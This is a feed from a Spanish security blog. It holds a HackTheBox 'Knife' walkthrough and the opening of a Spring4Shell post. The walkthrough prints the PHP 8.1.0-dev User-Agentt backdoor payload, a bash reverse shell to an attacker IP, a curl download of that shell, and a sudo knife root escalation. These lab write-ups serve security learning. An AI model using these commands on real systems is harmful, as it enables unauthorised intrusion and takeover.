<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-28T23:45:21-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">HTB Knife</title><link href="http://localhost:4000/knife/" rel="alternate" type="text/html" title="HTB Knife" /><published>2022-04-28T00:00:00-05:00</published><updated>2022-04-28T00:00:00-05:00</updated><id>http://localhost:4000/knife</id><content type="html" xml:base="http://localhost:4000/knife/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/knife/01inicio.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;¡Hola!
En esta ocasión vamos a resolver de la maquina &lt;strong&gt;Knife&lt;/strong&gt; de &lt;a href=&quot;https://app.hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt;.
La maquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!&lt;/p&gt;

&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;

&lt;p&gt;Para iniciar nuestra máquina, vamos a crear un directorio de trabajo con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;knife&lt;/code&gt; y los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;, con el objetivo de organizar la información que recopilemos en la realización de la máquina.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;knife
❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;knife
❯ &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;nmap exploit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h2&gt;

&lt;p&gt;Accedemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de una traza &lt;strong&gt;ICMP&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.242 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;ttl | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $4,$6}'&lt;/span&gt;
10.10.10.242: &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Identificamos que es una maquina &lt;strong&gt;Linux&lt;/strong&gt; debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTheBox).&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;TTL =&amp;gt; 64	Linux&lt;/li&gt;
  &lt;li&gt;TTL =&amp;gt; 128	Windows&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Continuamos con la enumeración de los &lt;strong&gt;65535&lt;/strong&gt; puertos en la máquina.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.242 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; openPorts | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;open
22/tcp open  ssh
80/tcp open  http
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luego de identificar los puertos abiertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPEN&lt;/code&gt;, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.10.10.242 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; deepScan
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-04-17 13:38 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.242
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.090s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Podemos identificar que el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; tiene una página web en servicio, por lo que revisamos con el explorador la página en cuestión.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/knife/03page.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Vamos a realizar un &lt;strong&gt;fuzzing&lt;/strong&gt; por medio de la generación de múltiples peticiones con diferentes terminaciones a la página web, con el fin de detectar rutas de acceso a información o explotación, sin embargo, no es posible la extracción de información que fuera de ayuda para el ejercicio (solo muestro el comando para fines educativos).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.242/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación, vamos a realizar la enumeración de software utilizado para la creación de la página web a través de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.242/
http://10.10.10.242/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.242], PHP[8.1.0-dev], Scrip&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como se puede ver, tenemos la versión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PHP 8.1.0-dev&lt;/code&gt;, la cual vamos a buscar en la base de datos de exploits por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit PHP 8.1.0-dev | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;dev
PHP 8.1.0-dev - &lt;span class=&quot;s1&quot;&gt;'User-Agentt'&lt;/span&gt; Remote Code Execution	| php/webapps/49933.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Encontramos un exploit que genera un backdoor por medio de una modificación en las cabeceras de la petición web, todo esto por con el fin de lograr un RCE (Remote Command Excecution).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot;User-Agentt: zerodiumsystem ('whoami');&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACIÓN&lt;/h2&gt;

&lt;p&gt;Bien, ahora que tenemos conocimiento de esta vulnerabilidad, vamo a probar en la maquina victima por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; que nos permite modificar parámetros como en este caso el &lt;strong&gt;User Agent&lt;/strong&gt; (Entramos a la carpeta exploit antes de ejecutar nuestra prueba).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../exploit
❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET http://10.10.10.242/ &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agentt: zerodiumsystem ('whoami');&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1
james
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;¡Tenemos ejecución remota de comandos! Podemos ver que el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt; es un usuario de la maquina víctima.&lt;/p&gt;

&lt;p&gt;Vamos a generar una reverse shell en bash para cargarla y después ejecutarla en la máquina, para esto creamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escalation.sh&lt;/code&gt; con el siguiente contenido.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;escalation.sh
&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.12/5555 0&amp;gt;&amp;amp;1'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora que tenemos nuestra reverse shell, vamos a iniciar en nuestra maquina un servidor web con ayuda de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server
Serving HTTP on 0.0.0.0 port 8000 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:8000/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luego de tener nuestro servidor activo, generamos una petición al servidor web victima por medio del exploit encontrado anteriormente, en esta ocasión para &lt;strong&gt;subir&lt;/strong&gt; el archivo en la maquina vulnerable.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET http://10.10.10.242/ &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'User-Agentt: zerodiumsystem(&quot; curl http://10.10.14.12:8000/escalation.sh -o /tmp/escalation.sh &quot;);'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Al tener la reverse shell solo queda ejecutarlo, sin embargo, antes de ejecutar el comando es necesario ponerse en escucha por el puerto que se indicó al momento de configurar la reverse shell, para este caso es el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5555&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 5555
Ncat: Version 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Finalmente ejecutamos el comando para accionar la reverse shell desde la maquina víctima.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET http://10.10.10.242/ &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'User-Agentt: zerodiumsystem(&quot; bash /tmp/escalation.sh &quot;);'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vamos a verlo en acción.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/knife/04intrusion.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;¡Obtenemos acceso a la maquina!&lt;/p&gt;

&lt;p&gt;El primer paso luego de obtener una shell es realizar el tratamiento de la TTY, por lo que dejare el procedimiento de cómo realizarlo (Esto se hace inicialmente en la maquina a la cual tenemos acceso).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash
^Z
&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fg
&lt;/span&gt;reset
xterm
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;XTERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora que estamos dentro de la maquina con el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt;, vamos a escalar privilegios para lograr ser &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, pero antes de eso vamos a leer la flag del usuario.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; user.txt 2&amp;gt;/dev/null
./home/james/user.txt
james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10 ./home/james/user.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
&lt;/span&gt;b2bf0e7aa5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;escalamiento&quot;&gt;ESCALAMIENTO&lt;/h2&gt;

&lt;p&gt;¡Perfecto! Ahora si vamos a revisar permisos por medio del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;, así podremos ver qué tipo de utilidades puede ejecutar el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt; con privilegios.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;james on knife:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User james may run the following commands on knife:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/knife
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt; puede ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;knife&lt;/code&gt; sin necesidad de ingresar credenciales.&lt;/p&gt;

&lt;p&gt;Por medio del recurso &lt;a href=&quot;https://gtfobins.github.io/gtfobins/knife/&quot;&gt;GTFOBins&lt;/a&gt; identificamos una vía potencial de escalamiento de privilegios, ejecutando lo siguiente.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;knife &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exec &quot;/bin/sh&quot;'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a realizar la prueba en nuestra maquina vulnerada.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;knife &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exec &quot;/bin/sh&quot;'&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;¡Logramos tener acceso a la maquina como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;!&lt;/p&gt;

&lt;p&gt;Solo hace falta buscar la flag correspondiente y eso sería todo.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# find . -name root.txt 2&amp;gt;/dev/null&lt;/span&gt;
./root/root.txt
&lt;span class=&quot;c&quot;&gt;# head -c 10 ./root/root.txt ; echo&lt;/span&gt;
4b01b07a6d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;¡Hemos logrado nuestra primera maquina del blog en HackTheBox!&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/knife/05finish.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Por último, les recomiendo seguir &lt;strong&gt;practicando&lt;/strong&gt; y si pueden generar contenido, mucho mejor! Espero les pueda servir de algo este material.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Writeup" /><category term="Knife" /><summary type="html">Vamos a resolver la maquina Knife de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">THM Spring4Shell</title><link href="http://localhost:4000/spring4shell/" rel="alternate" type="text/html" title="THM Spring4Shell" /><published>2022-04-13T00:00:00-05:00</published><updated>2022-04-13T00:00:00-05:00</updated><id>http://localhost:4000/spring4shell</id><content type="html" xml:base="http://localhost:4000/spring4shell/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/spring4shell/inicio.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;¡Hola!
En esta ocasión vamos a hablar de la maquina &lt;strong&gt;Spring4shell&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/&quot;&gt;TryHackMe&lt;/a&gt; lanzó hace unas semanas esta máquina para aprender acerca de una de las vulnerabilidades más sonadas del momento.&lt;/p&gt;

&lt;p&gt;El impacto de la vulnerabilidad asciende al nivel de que, &lt;a href=&quot;https://backtrackacademy.com/articulo&quot;&gt;piratas informáticos&lt;/a&gt; sacaron provecho de este acontecimiento para ejecutar el malware de botnet MIRAI en Singapur, descargando el programa malicioso en la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; y ejecutarlo, luego de un cambio de permisos bajo el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a ver un poco de la vulnerabilidad, limitaciones, explotación y remediaciones.&lt;/p&gt;

&lt;h2 id=&quot;vulnerabilidad&quot;&gt;VULNERABILIDAD&lt;/h2&gt;

&lt;p&gt;En marzo de 2022 se hace &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965&quot;&gt;pública&lt;/a&gt; la vulnerabilidad de &lt;strong&gt;ejecución remota de comandos&lt;/strong&gt; en el marco de Java Spring, específicamente en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Spring Cloud Functions&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Spring Core&lt;/code&gt;, generando un gran impacto en el framework.&lt;/p&gt;

&lt;p&gt;El mundo de &lt;strong&gt;Spring Framework&lt;/strong&gt; presenta una vulnerabilidad de ejecución remota de comandos, a través de una &lt;em&gt;webshell&lt;/em&gt; la cual es posible luego de forzar a escribir un archivo de extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.jsp&lt;/code&gt; en el servidor web.&lt;/p&gt;

&lt;p&gt;El principal &lt;strong&gt;riesgo&lt;/strong&gt; de el éxito en la explotación de esta vulnerabilidad se presenta en el potencial &lt;em&gt;escalamiento de privilegios&lt;/em&gt; para lograr un acceso total al servidor víctima y a la infraestructura de la organización afectada por el ataque.&lt;/p&gt;

&lt;h2 id=&quot;limitaciones&quot;&gt;LIMITACIONES&lt;/h2&gt;

&lt;p&gt;Las condiciones para poder explotar la vulnerabilidad &lt;strong&gt;Spring4shell&lt;/strong&gt; son las siguientes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;JDK 9+.&lt;/li&gt;
  &lt;li&gt;Spring Framework (&amp;lt;5.2 / 5.2.0-19 / 5.3.0-17).&lt;/li&gt;
  &lt;li&gt;Apache Tomcat como servidor de Spring, empaquetado como WAR.&lt;/li&gt;
  &lt;li&gt;Las dependencias spring-webmvc y/o spring-webflux como componentes del marco de Spring.&lt;/li&gt;
  &lt;li&gt;Uso de hacktools.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACIÓN&lt;/h2&gt;

&lt;p&gt;Para realizar la máquina, creamos un directorio y a su vez subdirectorios para organizar la información necesaria.&lt;/p&gt;

&lt;div class=&quot;language-zsh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;spring4shell
❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;spring4shell
❯ &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;nmap exploit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Realizamos un &lt;strong&gt;reconocimiento&lt;/strong&gt; por medio de ping, identificando por el TTL (Time To Live) que la maquina es &lt;em&gt;Linux&lt;/em&gt;.&lt;/p&gt;

